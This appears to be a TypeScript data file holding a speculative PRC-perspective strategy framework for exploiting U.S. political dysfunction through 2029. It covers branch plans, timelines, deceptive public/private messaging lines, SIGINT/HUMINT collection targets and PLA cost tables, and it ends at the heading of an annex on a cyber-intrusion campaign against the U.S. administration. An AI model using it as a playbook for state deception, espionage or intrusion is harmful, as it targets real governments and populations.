A U.S. planner would: (a) maintain or expand technology-export controls to raise the cost of Chinese industrial and military modernisation, (b) support allied diversification from Chinese supply chains (CHIPS Act-style industrial policy) to reduce Chinese economic leverage, (c) wait. The framework assumes Chinese resources are available for external action. If U.S. policy raises the cost of those actions while Chinese domestic growth slows, the framework's resource assumptions break. The counter: the domestic gating condition (no Option B below 3.5% growth) is the defence. But a U.S. planner who understands the gating condition will target it.

DEFEAT MODE 4: Accelerate the Window Closure (Targets the Entire Framework)
A U.S. planner would: (a) push bipartisan legislation committing the U.S. to rejoin withdrawn multilateral bodies on a fixed timeline (e.g., "WHO Re-engagement Act of 2027"), (b) signal early in the 2028 primary season that China policy is a consensus issue - removing the partisan dysfunction the framework exploits, (c) announce alliance-reaffirmation commitments before the 2028 election, binding the successor regardless of party. The counter: bipartisan legislation takes time. Alliance-reaffirmation commitments announced during a primary season may not survive the general election. But the risk is real: the window can be closed faster than the framework assumes.

DEFEAT MODE 5: Do Nothing - Let Beijing Overreach (Targets DM-1, DM-4)
The most elegant defeat mode: a U.S. planner recognises that the framework's recommended posture (Option A across all domains) is already cautious. The only way Beijing loses is by climbing escalation ladders. A U.S. planner who does nothing provocative - maintains baseline alliance commitments, avoids escalatory rhetoric, continues normal naval presence - gives Beijing no excuse to escalate, and the framework produces only baseline programmatic gains. The counter: this is already the framework's recommended outcome. DM-1 Option A programmatic pace is the highest-return action. The framework "succeeds" by not escalating. A U.S. planner who also does not escalate produces a stable equilibrium in which Beijing gains marginally from programmatic modernisation and the U.S. retains its alliance system.`;

// ---------------------------------------------------------------------------
// V-B. BRANCH PLANS
// ---------------------------------------------------------------------------

export const PRC_BRANCH_PLANS = `Three branch plans for the most likely deviations from the baseline scenario. Each branch is a decision tree: trigger condition, recommended response, second-order effects of the response, and reversion conditions.

BRANCH 1: EARLY U.S. STRATEGIC REVERSAL
Trigger: A U.S. course correction occurs before Q4 2028. Indicators include (a) bipartisan legislation to rejoin two or more withdrawn multilateral bodies, (b) tariff exemptions offered to allies in exchange for explicit alliance-reaffirmation commitments, (c) senior U.S. official statements framing alliance solidarity as a priority over trade disputes. Any two of three indicators active within 6 months = branch activation.

Recommended response: Immediate suspension of all Option B activity across all domains. Revert to Option A posture. Signal through back-channels that Beijing is not seeking to exploit U.S. dysfunction - frame any existing gains (trade agreements, institutional commitments) as normal diplomatic activity, not window-exploitation. The framework's value is that it can be suspended without assets becoming liabilities - provided suspension is early and clean.

Second-order effects: Suspension itself may be read as weakness by allies who were hedging toward Beijing. But continued exploitation in the face of confirmed U.S. reversal is costlier: it provides the unifying casus belli for the reconsolidation. The branch trades short-term positioning for long-term stability.

Reversion: If the U.S. reversal proves temporary (policy shift reversed within 12 months), resume Option A posture and re-assess. Do not resume Option B without a fresh 9-month signal-confirmation period.

BRANCH 2: TAIWAN STRAIT OR SOUTH CHINA SEA INCIDENT
Trigger: Any military incident involving U.S. or allied forces and PLA forces, regardless of initiator. The incident may be accidental (collision, near-miss escalating) or deliberate (Taiwan political provocation, South China Sea enforcement escalation).

Recommended response: The framework suspends immediately. All quarterly milestones, decision gates, and Option B authorisations are void. Priority shifts to de-escalation: direct leader-to-leader communication, military-to-military channel activation, third-party mediation if available. Do not determine fault publicly - de-escalate first, attribute later. The single objective is to prevent the incident from becoming the organising event of U.S. alliance reconsolidation.

Second-order effects: The incident will be used by U.S. planners to accelerate alliance reconsolidation regardless of fault. The speed and credibility of Chinese de-escalation determines whether the incident becomes a temporary disruption or a permanent strategic reversal. A slow or defiant Chinese response guarantees the latter.

Reversion: If de-escalation succeeds and the incident does not produce lasting alliance-reconsolidation effects within 12 months, the framework may be reactivated with a fresh baseline assessment. The reactivation threshold is higher than the initial threshold: two consecutive quarters with no concern thresholds active across all domains.

BRANCH 3: CHINESE DOMESTIC CONSTRAINT MATERIALISATION
Trigger: GDP growth below 3.5% for two consecutive quarters, OR property-sector crisis deepens (two or more major developer defaults within 6 months), OR youth unemployment exceeds 20% for two consecutive quarters. Any one of three = branch activation.

Recommended response: Suspend all Option B activity. Scale back Option A commitments to core programmatic actions (DM-1 defence-technical is the last to scale back; DM-2 institutional commitments with binding financial obligations are the first). Do not announce the suspension - frame it as "operational reprioritisation." Do not signal that external action is constrained by domestic weakness - that signal is exploited by adversaries.

Second-order effects: The primary risk is that allies and partners who committed to Chinese-led alternatives (BRICS, AIIB, SCO) observe the resource constraint and hedge back toward U.S.-led institutions. The secondary risk is that U.S. planners detect the constraint and escalate pressure. Mitigation: maintain the appearance of steady-state Option A posture; the constraint is internal, not external-facing.

Reversion: If domestic indicators return above threshold levels for two consecutive quarters, Option B planning may resume but with a higher domestic-resource-headroom requirement (4.5% growth, not 3.5%). The branch is designed to prevent a single-quarter recovery from triggering premature re-escalation.`;

// ---------------------------------------------------------------------------
// V-B-2. PRIORITY TASKING ORDER
// ---------------------------------------------------------------------------

export const PRC_PRIORITY_ORDER = `Resource-constrained prioritisation. If Beijing can execute every Option A action across all domains, no prioritisation is needed. If resources, political capital, or bandwidth are constrained, execute in this order:

TIER 1 - MUST DO (Maximum return, minimum cost, no diplomatic friction)
1. DM-1 Option A: PLA programmatic modernisation pace. Continue. Do not announce. This is the single highest-risk-adjusted-return action in the framework. It proceeds regardless of all other decisions.
2. Signal Watch List: Maintain all six watch signals at specified cadences. Without current signal data, the framework is blind. This costs almost nothing and enables every other decision.

TIER 2 - SHOULD DO (Moderate return, moderate cost, manageable second-order effects)
3. DM-2 Option A: Selective institutional vacuum-filling (WHO funding leadership if DM-2 thresholds crossed). Agenda-setting return justifies the financial cost. Sovereignty cost is manageable.
4. DM-4 Option A: Incremental CIPS expansion and bilateral swap lines. Plumbing is long-term; marginal cost is low; countermeasure risk is manageable at Option A pace.
5. Decision Register: Execute DEC-1 through DEC-5 on schedule. The decisions themselves cost nothing to make. They prevent the framework from becoming an un-actioned paper product.

TIER 3 - NICE TO DO (High potential return, high cost or high second-order risk)
6. DM-3 Option A: Passive alliance availability. Requires no active resourcing beyond normal diplomatic posture. Return is slow but costs nothing.
7. DM-5 Option A: Attribution-free circulation of Western-self-reported evidence. Low cost, moderate long-term return.

TIER 4 - DO NOT DO WITHOUT EXPLICIT AUTHORISATION (Extreme risk, can lose the framework)
8. Any Option B action in any domain. All Option B actions carry second-order costs that can exceed the framework's total potential return. None are authorised without a Decision Register entry signed at the appropriate level.
9. Any escalation beyond Rung 2 on any ladder. Rungs 3-5 on the alliance ladder, Rung 3-4 on the economic ladder, and Rungs 3-4 on the military ladder should not be climbed under any scenario contemplated by this framework.

IF YOU CAN ONLY DO ONE THING: DM-1 Option A. Continue PLA modernisation at programmatic pace. Do not announce it. Everything else is secondary.`;

// ---------------------------------------------------------------------------
// V-B-3. INTEGRATED MASTER TIMELINE
// ---------------------------------------------------------------------------

export const PRC_MASTER_TIMELINE = `Single chronological view across all domains. Events are opening or closing windows for specific actions.

JUN 2026. NATO Summit (The Hague). WATCH: Allied defence-spending commitments. If spending commitments decline or plateau citing U.S. reliability concerns: DM-3 opportunity threshold crossed. // 15th Five-Year Plan drafting final. WATCH: Resource-allocation signals for external action.

JUL-AUG 2026. BRICS Summit (TBC). WATCH: Expansion applications, de-dollarisation language in communique. // SCO Summit (TBC). WATCH: Security-cooperation language, observer-state applications.

SEP 2026. UNGA High-Level Week. WATCH: U.S. participation level; allied voting alignment with U.S.; Global South alignment with Chinese positions on governance resolutions. // U.S. midterm campaigns intensify. NOTE: Signal environment degrades from this point through Nov 2026.

NOV 3, 2026. U.S. midterm elections. WATCH: Congressional composition. If either chamber flips: U.S. domestic trajectory shifts. If both chambers remain aligned with administration: dysfunction window extends.

DEC 2026. Decision Register DEC-1 due. // IMF COFER Q3 2026 data. WATCH: RMB reserve share. // Allied defence white papers (annual Q4 cycle). WATCH: China-threat language intensity.

JAN 2027. New U.S. Congress convenes. WATCH: China-related legislation introduced. Re-engagement bills (WHO, Paris) are early indicators of post-2029 trajectory. // Two Sessions prep begins (NPC/CPPCC Mar 2027). WATCH: Domestic resource-allocation signals.

FEB 2027. Munich Security Conference. WATCH: U.S. delegation level and messaging on alliances. Allied responses. If U.S. delegation signals alliance recommitment: DM-3 concern threshold approached.

MAR 2027. Two Sessions (NPC/CPPCC). WATCH: 15th Five-Year Plan implementation guidance. Defence budget. Foreign-policy direction. // IMF COFER Q4 2026 data. WATCH: RMB reserve share trend.

JUN 2027. Decision Register DEC-2 due (WHO funding leadership decision). // NATO Summit (TBC). WATCH: Alliance cohesion signals. // G7 Summit (TBC). WATCH: China language in communique.

AUG-SEP 2027. BRICS Summit (TBC, likely Brazil). WATCH: De-dollarisation language, expansion decisions. // SCO Summit (TBC). // UNGA High-Level Week. // PLA Anniversary (Aug 1). NOTE: Avoid provocative exercises during this window unless DM-1 signal environment confirms opportunity.

SEP 2027. Decision Register DEC-3 due (PLA operational tempo decision). // U.S. presidential primary field forming. NOTE: Signal environment begins degrading from this point.

JAN-FEB 2028. U.S. presidential primaries begin (Iowa, New Hampshire). WATCH: China-policy positions of leading candidates. If consensus forms on China as threat: window closure accelerates. If partisan division persists: window remains open.

JUN-JUL 2028. Decision Register DEC-4 may be triggered (ally approach - event-driven, no fixed date). // NATO Summit (TBC). // U.S. party conventions (Jul-Aug 2028). WATCH: Party platform China language.

SEP-NOV 2028. UNGA High-Level Week. // U.S. general election campaign. NOTE: Signal environment maximally degraded. No new action initiations after Q2 2028 per milestone no-go criteria.

NOV 7, 2028. U.S. election. DECISION: Branch Plan 1 may activate if result signals strategic reversal. // Transition begins. WATCH: President-elect China-policy appointments.

NOV-DEC 2028. Decision Register DEC-5 due (defend/abandon decision). // Lame-duck congressional session. WATCH: Last-minute China legislation.

JAN 20, 2029. INAUGURATION DAY. WINDOW CLOSES. All framework milestones, decision gates, and Option B authorisations expire. Post-window assessment begins.`;

// ---------------------------------------------------------------------------
// V-B-4. SUCCESS GATES
// ---------------------------------------------------------------------------

export const PRC_SUCCESS_GATES = `Per-quarter pass/fail criteria. If a gate is failed, the framework's assumptions require revision - not necessarily abandonment, but explicit reconsideration.

Q3 2026 (Assessment Gate): PASS if baseline watch-signal data is complete for all five domains and no crisis event has occurred. FAIL if a Taiwan Strait or South China Sea incident forces framework suspension. STATUS: Binary. Assessment is the only deliverable.

Q4 2026 (Signal-Confirmation Gate): PASS if no watch signal has crossed a concern threshold AND at least one opportunity threshold has produced sustained signal for 3+ months. FAIL if two or more concern thresholds are active - this indicates the window may be closing faster than the framework assumes. NOTE: False positives expected during U.S. midterm cycle. FAIL here means "re-assess in Q1 2027," not "abandon."

Q1 2027 (First Action Gate): PASS if (a) 9 months of confirmed signal data is available, (b) at least one DM has sustained opportunity-threshold crossing, and (c) Chinese domestic growth rate is above 3.5% annualised. FAIL if all three conditions are not met. This is the first gate where failure has consequence: if no DM has a crossed threshold by Q1 2027, the window may not be producing actionable exposures. Re-assess the Intelligence Estimate.

Q2-Q3 2027 (Mid-Window Gate): PASS if (a) the cumulative signal pattern confirms the Intelligence Estimate judgments (i.e., exposures are real and persistent), (b) at least one Option B action has been authorised in at least one domain, and (c) no DM has triggered an abort condition on an authorised action. FAIL if the Intelligence Estimate is disconfirmed by the signal pattern. This is the framework's most important gate. If the IE is wrong, all downstream decisions are unsound.

Q4 2027-Q2 2028 (Peak Window Gate): PASS if (a) authorised Option B actions are producing positive indicators without triggering abort conditions, (b) no concern threshold has been crossed in DM-3 (alliance) or DM-4 (economic) - these are the domains where reversal risk is highest, and (c) Chinese domestic growth remains above 3.5%. FAIL if Option B actions have triggered abort conditions or concern thresholds are crossed in high-risk domains. FAIL means immediate reversion to Option A and consolidation of defensible gains.

Q3 2028-Q1 2029 (Closure Gate): PASS if Decision Register DEC-5 is complete (decision made on which gains to defend). This gate has no pass/fail beyond that: the window is closing regardless. The success metric is whether the post-window assessment (due Q2 2029) concludes that the framework produced net positive return. A framework that produced no Option B actions but preserved the Option A baseline across all domains is a successful framework - it prevented costly errors. A framework that authorised Option B actions that triggered abort conditions is a failed framework regardless of the window outcome.`;

// ---------------------------------------------------------------------------
// V-B-5. COMMUNICATIONS GRID
// ---------------------------------------------------------------------------

export const PRC_COMMS_GRID = `Per-phase public line, private line, and red line. The public line is what state media, MFA spokespersons, and official channels may say. The private line is what diplomatic back-channels and closed-door meetings may convey. The red line is what must never be said under any circumstance.

PHASE: Q3-Q4 2026 (Assessment)

PUBLIC: "China remains committed to peaceful development and win-win cooperation. We monitor global developments with attention to the evolving international situation." (Reveals nothing.)

PRIVATE (to soliciting allies): "China is a stable economic partner. We are open to discussing trade facilitation and institutional cooperation on terms that respect mutual interests." (Opens door without committing.)

RED LINE: Do not say "the United States is in decline." Do not say "the American alliance system is fracturing." Do not say "China will fill the vacuum." Do not reference the Caligula Window or any framework concept. Do not use the term "东升西降" in official communications.

PHASE: Q1-Q3 2027 (First Action)

PUBLIC: "China supports multilateralism and the rules-based international order. We are increasing our contributions to global public goods, including health and climate finance, as our development level permits." (Frames institutional commitments as responsible stakeholder behaviour, not exploitation.)

PRIVATE (to soliciting allies): "We note your interest in diversifying economic partnerships. China is prepared to discuss trade-agreement frameworks that are complementary to existing arrangements, not substitutes for them." (Frames as complement, not replacement - critical for keeping below Rung 3 on the alliance ladder.)

RED LINE: Do not frame any bilateral agreement as "reducing dependence on the United States." Do not publicly characterise any ally's approach to China as "recognition of American decline." Do not offer security guarantees. Do not discuss arms sales. Do not reference alliance-realignment concepts.

PHASE: Q4 2027-Q2 2028 (Peak Window/Consolidation)

PUBLIC: "China's international cooperation continues to deepen across trade, development finance, and institutional participation. We welcome all states seeking mutually beneficial partnerships." (Generic. Reveals nothing about specific gains.)

PRIVATE (to partners with locked-in agreements): "The agreements we have reached are durable and not contingent on any particular political configuration in third countries. China honours its commitments." (Signals that gains survive the window without revealing that the window was the logic for the gain.)

RED LINE: Do not signal triumphalism about window-gains. Do not characterise the 2028 U.S. election as irrelevant. Do not suggest that China has "won" anything. Do not say "the post-American order." Do not announce any new initiative, agreement, or commitment during the U.S. election period (Q3-Q4 2028) under any circumstance.

PHASE: Q1 2029 and beyond (Post-Window)

PUBLIC: "China is prepared to engage constructively with any U.S. administration on the basis of mutual respect and mutual benefit. We do not predicate our foreign policy on the internal political arrangements of other states." (Resets the table without conceding anything.)

PRIVATE (to successor administration): "China's bilateral agreements and institutional commitments are normal diplomatic activity, not contingent on any prior administration's policies. We look forward to discussing areas of mutual interest." (Positions existing gains as the new baseline, not as window-exploitation that needs reversing.)

RED LINE: Do not frame window-closure as defeat. Do not concede that any gain was "opportunistic" or "window-dependent." Do not offer to renegotiate agreements as a gesture of goodwill - this signals that the agreements were contingent and invites demands for broader reversal. Do not continue Option B actions after the window closes. The framework ends on Jan 20, 2029. Treat its expiration as priced, not as lost.`;

// ---------------------------------------------------------------------------
// V-B-6. ASSUMPTIONS REGISTER
// ---------------------------------------------------------------------------

export const PRC_ASSUMPTIONS = `Every structural assumption the framework rests on. If an assumption is wrong, the section of the framework that depends on it requires revision. Presented as: Assumption / Depends on / Consequence if false / Current confidence.

A1: U.S. alliance dysfunction persists through Q4 2028. // Depends on: DM-3, DM-2, Quarterly Milestones. // If false: DM-3 Option A becomes the only viable posture; DM-2 institutional gains may be reversed by allied re-engagement. Timeline compresses. // Confidence: Moderate. Historical precedent (post-Vietnam, post-Iraq, post-Trump-I) suggests U.S. alliances are more resilient than single-administration dysfunction. The framework's single most consequential assumption.

A2: Chinese domestic growth sustains above 3.5% annualised through Q4 2028. // Depends on: All Option B actions; quarterly gating condition. // If false: All Option B is suspended. Option A baseline may require scaling. The framework's resource assumptions break. // Confidence: Moderate. Growth trajectory is uncertain; property sector unresolved; demographics declining.

A3: No Taiwan Strait or South China Sea military incident occurs. // Depends on: Entire framework. // If false: The framework suspends. Crisis management replaces strategic exploitation. Branch Plan 2 activates. // Confidence: Moderate. Risk is real but controllable through escalation discipline. This assumption is a choice, not a prediction - Beijing controls the probability.

A4: U.S. attention and resources remain divided between domestic dysfunction and external competition. // Depends on: DM-1, DM-3, DM-4. // If false: U.S. focus sharpens on China competition; alliance reconsolidation accelerates; countermeasures escalate. The window narrows. // Confidence: Moderate-High. Current administration's domestic focus is documented. But external crisis (Taiwan, Ukraine, Middle East) could reorder U.S. priorities rapidly.

A5: Allied hedging is driven by U.S. reliability concerns, not by Chinese attractiveness. // Depends on: DM-3 Option A logic. // If false: Beijing is over-reading tactical irritation as strategic realignment. DM-3 gains evaporate when U.S. reliability is restored. // Confidence: Moderate. Allies are hedging against U.S. unreliability, not moving toward China. The distinction is critical.

A6: The dollar system is not vulnerable to displacement within the framework's timeframe. // Depends on: DM-4 Option A/B logic; Escalation Ladder DM-4. // If false (over-estimated): Beijing leaves value on the table by not pursuing aggressive de-dollarisation. If false (under-estimated): aggressive de-dollarisation accelerates the countermeasure response that destroys the plumbing before it takes hold. // Confidence: High. Structural foundations of dollar dominance (deep markets, rule-of-law, no capital controls) are not replicable within 3-5 years.

A7: The framework itself remains within the authorised decision-making circle. // Depends on: Entire framework. // If false: A U.S. planner obtains the framework and implements the Red Team defeat modes. All watch-signal thresholds become manipulable. All decision-gate schedules become predictable. The framework becomes a liability to its user. // Confidence: Depends on OPSEC discipline.`;

// ---------------------------------------------------------------------------
// V-B-7. INTELLIGENCE GAPS
// ---------------------------------------------------------------------------

export const PRC_INTEL_GAPS = `Specific information the framework requires but does not currently possess. Each gap has a collection requirement: what to task, against what target, at what priority.

GAP 1: U.S. administration's internal decision logic on alliance management. // We observe outputs (tariff announcements, cost-sharing demands, withdrawal threats). We do not observe inputs: is alliance coercion a deliberate strategy or ad-hoc reaction? Are allies being prioritised for relief or for pressure? // Collection requirement: SIGINT on White House/NSC deliberations on alliance policy; HUMINT from allied diplomatic reporting on U.S. bilateral meetings. // Priority: Critical. DM-3's entire logic depends on whether U.S. alliance pressure is sustained or temporary.

GAP 2: Successor administration's China-policy intentions. // The framework assumes the window closes on Jan 20, 2029, and that a successor may reverse some gains. We do not know which candidate will win, what their China policy will be, or whether they will prioritise reversing Chinese gains or addressing domestic priorities. // Collection requirement: Open-source monitoring of candidate positions (primary season Q1 2028); HUMINT from campaign foreign-policy advisory circles; analysis of party-platform drafting. // Priority: High from Q1 2028.

GAP 3: Allied red lines on Chinese security cooperation. // We know allies are hedging on trade. We do not know at what point hedging becomes unacceptable to the ally's own security establishment: is trade facilitation acceptable but defence consultations unacceptable? Is BRICS membership acceptable but SCO security-cooperation unacceptable? Where is each ally's line? // Collection requirement: HUMINT from allied defence and foreign ministries; diplomatic reporting from Chinese embassies in key allied capitals (Tokyo, Seoul, Canberra, Berlin, London, Ottawa). // Priority: High. Climbing the DM-3 escalation ladder without knowing allied red lines risks triggering the alliance-reconsolidation response.

GAP 4: U.S. intelligence community's assessment of Chinese strategy. // We do not know what U.S. intelligence assesses about Chinese intentions, red lines, and decision-making processes. If the U.S. IC has penetrated Chinese decision-making, the framework's OPSEC is already compromised. // Collection requirement: Counter-intelligence: monitor for signs of U.S. knowledge of internal Chinese strategic deliberations. SIGINT on U.S. IC reporting on China. // Priority: Critical. The framework's single greatest vulnerability is that it assumes its own secrecy.

GAP 5: Actual (vs announced) Chinese defence procurement costs and timelines. // The PLA annex uses open-source estimates. Actual costs, timelines, and platform readiness may differ. The framework's confidence in DM-1 depends on the accuracy of those estimates. // Collection requirement: Internal PLA procurement data; defence-industrial base production-rate data. // Priority: Moderate. DM-1 proceeds regardless. The gap affects confidence in specific capability timelines, not the decision to proceed.

GAP 6: Global South state preferences between Chinese and U.S. institutional leadership. // We observe membership numbers (BRICS, AIIB, SCO). We do not observe genuine preferences: do states join Chinese-led institutions because they prefer Chinese leadership, or because they seek benefits from both systems simultaneously? The distinction determines whether institutional gains survive U.S. re-engagement. // Collection requirement: Diplomatic reporting from Chinese embassies in key Global South capitals; polling data (Pew, Gallup, Arab Barometer) cross-referenced with institutional participation data; analysis of UN voting patterns on China-sponsored vs U.S.-sponsored resolutions. // Priority: High. DM-2's entire logic depends on whether institutional gains are genuine or opportunistic.`;

// ---------------------------------------------------------------------------
// V-B-8. DECISION LOGIC (Critical Path)
// ---------------------------------------------------------------------------

export const PRC_DECISION_LOGIC = `The framework's single most critical decision chain, expressed as executable logic. If a staff officer executes only this chain, the framework's core value is preserved.

STEP 0 (Continuous): Maintain DM-1 Option A. PLA programmatic modernisation proceeds at established pace. This requires no decision - it continues regardless. All other decisions are subordinate to this baseline.

STEP 1 (Q3-Q4 2026): Confirm signal environment.
  IF (any crisis event occurs): GOTO CRISIS BRANCH (Branch Plan 2).
  IF (U.S. midterm elections produce false positives): WAIT. Re-assess Q1 2027.
  IF (no concern thresholds crossed AND one or more opportunity thresholds confirmed): PROCEED to STEP 2 in Q1 2027.
  ELSE: MAINTAIN Option A. Re-assess Q2 2027.

STEP 2 (Q1 2027): First decision gate.
  IF (Chinese growth < 3.5%): GOTO CONSTRAINT BRANCH (Branch Plan 3).
  IF (DM-2 institutional thresholds crossed): EVALUATE DEC-2 (WHO funding leadership).
  IF (DM-3 alliance thresholds crossed): EVALUATE low-visibility trade discussions. REMAIN below Rung 3.
  IF (DM-4 economic thresholds crossed): CONTINUE incremental plumbing. Do not escalate.
  IF (no thresholds crossed after 9 months): RE-ASSESS Intelligence Estimate. The window may not be producing actionable exposures.

STEP 3 (Q2-Q3 2027): Mid-window assessment.
  IF (Intelligence Estimate confirmed by cumulative signal pattern): AUTHORISE Option B in up to two domains.
  IF (Intelligence Estimate disconfirmed): REVERT to Option A. This is the framework's most important gate.
  IF (two or more concern thresholds active): The window may be closing faster than assumed. CONSOLIDATE. Do not initiate.
  IF (DM-3 alliance concern threshold active): IMMEDIATELY suspend all DM-3 activity above Rung 1.

STEP 4 (Q4 2027 - Q2 2028): Peak window.
  IF (Option B actions triggered abort conditions): REVERT to Option A in that domain. Document why.
  IF (Option B actions producing positive indicators): CONSOLIDATE. Do not escalate further.
  IF (U.S. primary field forming consensus on China threat): PREPARE for early window closure. No new initiations.
  IF (U.S. primary field divided on China): Window remains open. Maintain posture.
  NO NEW INITIATIONS AFTER Q2 2028 regardless of signals.

STEP 5 (Q3-Q4 2028): Window closure.
  IF (U.S. election result signals strategic reversal): ACTIVATE Branch Plan 1.
  IF (U.S. election result signals continuation): Window may extend beyond framework assumptions. Re-assess post-inauguration.
  EXECUTE DEC-5: defend/abandon decision for all Phase I-II gains.

STEP 6 (Jan 20, 2029): Framework expires. Post-window assessment due Q2 2029.

CRISIS BRANCH (any time): IF (Taiwan Strait or SCS incident): IMMEDIATELY suspend framework. De-escalate. GOTO Branch Plan 2.

CONSTRAINT BRANCH (any time): IF (growth < 3.5% for two quarters): SUSPEND all Option B. Scale Option A to core. GOTO Branch Plan 3.`;

// ---------------------------------------------------------------------------
// V-C. OPSEC ANNEX
// ---------------------------------------------------------------------------

export const PRC_OPSEC = `This annex defines what must NOT be done to preserve the framework's operational security. The framework is useful only if its existence, structure, and decision logic remain within the authorised decision-making circle. A U.S. planner who obtains this framework can defeat it using the Red Team assessment above.

RULES OF THE FRAMEWORK

Rule 1: Do not cite this framework in any written product outside the authorised distribution circle. The framework exists as a decision-support instrument. It does not exist as a policy document, a public white paper, a diplomatic communication, or a media talking-point. References to "the Caligula Window," "the decision framework," "exposure-action-cost analysis," or "DM-1 through DM-5" in any unsecured communication constitute an OPSEC breach.

Rule 2: Do not reveal the watch-signal thresholds. The framework's watch signals have specific thresholds (e.g., "carrier strike group gap exceeding 90 days," "RMB reserve share exceeding 4%," "allied cost-sharing refusal rate"). If U.S. planners know these thresholds, they can manipulate the signal environment - maintaining gaps at 89 days, keeping RMB share at 3.9%, granting just enough cost-sharing relief to avoid triggering the threshold. The thresholds lose their operational value if exposed. They must remain within the decision circle.

Rule 3: Do not reveal the quarterly decision-gate schedule. The framework's decision gates are timed to specific calendar events (NATO summits, BRICS summits, UNGA, U.S. election cycles). If the schedule is known, U.S. planners can time their own actions to pre-empt or disrupt Beijing's decision cycles. The gates exist to filter signal from noise; exposed gates become noise-generators themselves.

Rule 4: Do not reveal the escalation-ladder rungs. The framework's escalation ladders define specific thresholds for climbing from one rung to the next (e.g., "publicly announced bilateral trade agreement" before "defence consultations"). If U.S. planners know the rung structure, they can calibrate their responses to appear just below the next rung's trigger threshold, denying Beijing the signal basis for escalation while continuing their own competitive behaviour.

Rule 5: Do not reveal the Red Team assessment. The Red Team assessment (Section V) identifies the five defeat modes a U.S. planner would use against this framework. That assessment must not be the basis for a U.S. planner's actual defeat campaign. The framework's single most valuable section is also its single most dangerous if exposed.

Rule 6: The framework is a living document. It must be updated at each decision gate with actual watch-signal readings, decisions taken, and outcomes observed. An un-updated framework is worse than no framework - it provides the illusion of structured decision-making without the substance. The post-Q1 2029 version of this framework must include a post-window assessment section: which decisions were correct, which were wrong, and what the framework's own performance reveals about its structural assumptions.`;

// ---------------------------------------------------------------------------
// V. DEFENCE-TECHNICAL ANNEX
// ---------------------------------------------------------------------------

export const PRC_PLA_SECTION: PrcSection = {
  title: 'Annex: PLA Cost-Exchange Tables',
  body: `This annex quantifies the engineering basis for DM-1 (Defence-Technical Positioning). Platform counts, ranges, and costs are derived from U.S. DoD annual reports, USNI Proceedings, IISS Military Balance, and independent OSINT modelling. All figures are open-source estimates, not classified.

PLATFORM INVENTORY (Open-Source Estimates, mid-2026)
- Type 055 Renhai-class: 8 commissioned (101 Nanchang, 102 Lhasa, 103 Dalian, 104 Yan'an, 105 Anshan, 106 Zunyi, 107 Wuxi, 108 Xianyang), 2-4 in trials/fitting. 12,000-13,000 tons displacement. 112 universal VLS cells (YJ-18A ASCMs, YJ-100 long-range ASCMs, HHQ-9B long-range SAMs, YJ-21 hypersonic ASBMs possible). Unit cost approx $900M-$1.1B.
- DF-26 intermediate-range ballistic missile: deployed across at least 5 brigades. 3,000-4,000 km range. Dual conventional/nuclear. Anti-ship variant (DF-26B) with manoeuvring re-entry vehicle. Unit cost approx $30-50M.
- DF-21D "carrier-killer": deployed across at least 4 brigades. 1,500+ km range. Conventional anti-ship with terminal manoeuvring. Unit cost approx $10-15M.
- DF-17 hypersonic glide vehicle: operational since 2019. 1,800-2,500 km range. Hypersonic glide vehicle payload. Difficult to intercept due to manoeuvring trajectory and speed (Mach 5+). Unit cost unknown.
- Type 003 aircraft carrier (Fujian): 1 hull, CATOBAR configuration with electromagnetic catapults. Sea trials underway (2024-2026). 80,000+ tons. 30-40 aircraft capacity.
- Unmanned systems portfolio: WZ-8 high-altitude supersonic reconnaissance UAV; GJ-11 Sharp Sword stealth UCAV; various maritime UAV/USV platforms in operational testing.

U.S. COMPARATOR (Current Administration)
- Trump-class battleship: conceptual only. No contract awarded. No design finalised. No shipyard allocated. Preliminary specifications suggest 30,000+ tons, large radar cross-section, 1950s-era battleship concept with modern systems. Independent OSINT modelling ranks it LAST by value_index.
- DDG(X) next-generation destroyer: delayed. Original IOC target 2028 now unlikely before 2031-2032.
- Constellation-class frigate: first-in-class behind schedule. 20-hull programme facing cost and timeline pressure.
- Golden Fleet branding: marketing concept, no procurement impact.

COST-EXCHANGE RATIO (Illustrative)
- One Type 055 ($1B): imposes on U.S. naval planners the cost of multiple LRASM-equipped aircraft sorties, submarine tasking, and ISR assets per engagement. Estimated U.S. cost to penetrate the envelope within which a Type 055 operates: 3-5x the Type 055 unit cost.
- One DF-26 brigade ($1.5-2.5B total): holds at risk carrier strike groups at 3,000+ km. U.S. counter-cost: SM-3/SM-6 procurement, space-based sensor layer (SDA Tranche 1-2), distributed maritime operations reorganisation. Estimated 5-10x the DF-26 brigade cost.
- One DF-21D brigade ($400-600M): holds at risk surface combatants within First Island Chain. U.S. counter-cost: EW/jamming, decoy systems, distributed lethality reorganisation. Estimated 3-5x.

NET ASSESSMENT
DM-1 Option A (programmatic pace) produces widening cost-exchange ratios at the cost of baseline procurement - approximately $250-300B/year (SIPRI estimate), already allocated. The second-order costs are minimal because programmatic modernisation is not contingent on U.S. behaviour; it proceeds regardless. No other domain offers this combination of confirmed return, minimal second-order cost, and independence from diplomatic posture. DM-1 Option A is the highest-risk-adjusted-return action in the framework by a significant margin.

The engineering advantage is best preserved by not advertising it. Every public announcement of a Type 055 commissioning invites counter-investment. Every DF-26 deployment publicised triggers allied defence-spending increases. The framework's single most important operational principle for DM-1: continue. Do not announce.`,
  sources: [
    {
      citation:
        "U.S. DoD, 'Military and Security Developments Involving the PRC' (annual, 2023-2024)",
      type: 'official-record',
    },
    {
      citation:
        'USNI Proceedings, Type 055 (Mar 2023); ONI 200x shipbuilding-capacity slide (TWZ, 2023-2024)',
      type: 'journalism',
    },
    {
      citation:
        'OSINT Defense-CAD cost-benefit analysis (osint-defense.web.app)',
      type: 'modern-scholarship',
    },
    {
      citation:
        "PRC State Council, 'China's National Defence in the New Era' (July 2019)",
      type: 'official-record',
    },
  ],
};

// ---------------------------------------------------------------------------
// ANNEX B: PERSISTENT ACCESS CAMPAIGN - OPERATIONAL CONCEPT
// ---------------------------------------------------------------------------

export const PRC_CYBER_ANNEX = `Annex B describes a conceptual persistent-access cyber campaign targeting the current U.S. administration. It is presented as a technical-operational scenario to be assessed, not as advocacy or evidence of actual operations. The campaign is modelled on known APT TTPs, open-source tooling, and the specific exposure surfaces the administration presents. All techniques described are derived from publicly documented attack frameworks (MITRE ATT&CK, CISA advisories, industry threat-intelligence reporting). The annex should be read alongside the OPSEC Annex (Section V-C) and the Red Team assessment (Section V) - a U.S. defender who obtains this annex can defeat the described campaign using the same logic.

OPERATIONAL CONCEPT

